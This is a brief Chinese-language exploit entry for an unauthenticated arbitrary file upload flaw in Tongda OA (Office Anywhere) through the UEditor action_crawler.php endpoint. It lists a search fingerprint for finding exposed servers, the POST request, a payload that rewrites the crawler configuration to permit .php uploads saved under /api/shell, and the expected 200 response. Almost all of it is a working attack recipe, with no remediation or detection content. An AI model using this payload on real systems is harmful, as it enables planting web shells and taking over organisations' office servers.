# 通达OAaction_crawler前台任意文件上传漏洞

通达OA ｜ 文件上传 ｜ —
- **指纹**：`title="office Anywhere"`
- **请求**：`POST /module/ueditor/php/action_crawler.php HTTP/1.1`

**Payload**
```
CONFIG[catcherPathFormat]=/api/shell&CONFIG[catcherMaxSize]=100000&CONFIG[catcherAllowFiles][]=.php&CONFIG[catcherAllowFiles][]=.ico&CONFIG[catcherFieldName]=file&file[]=https://www.baidu.com/img/flexible/logo/pc/result.png
```
- **响应特征**：200